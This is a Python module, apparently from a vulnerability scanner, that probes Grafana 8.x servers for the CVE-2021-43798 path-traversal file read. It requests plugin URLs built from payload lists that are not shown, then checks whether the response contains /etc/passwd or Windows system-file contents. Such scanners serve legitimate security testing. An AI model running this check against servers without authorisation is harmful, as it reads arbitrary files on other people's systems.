#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
from time import sleep
import re

def cve_2021_43798_scan(self, url):
    ''' 2021年12月, 一位Twitter用户披露了一个0day漏洞, 
        未经身份验证的攻击者可以利用该漏洞通过 Grafana 8.x 的插件url来遍历web路径并下载任意文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'File-Read'
    vul_info['vul_id'] = 'CVE-2021-43798'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_43798_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            for plugins in self.cve_2021_43798_plugins:
                sleep(0.5)                                                            # * 防止扫描过快
                
                res = requests.get(
                    target.format(plugins), 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG

                if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                    or (('Microsoft Corp' in res.text) 
                        and ('Microsoft TCP/IP for Windows' in res.text))
                ):
                    results = {
                        'Target': res.request.url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'Url': url,
                            'Path': res.request.path_url,
                        },
                        'Request': res
                    }
                    return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
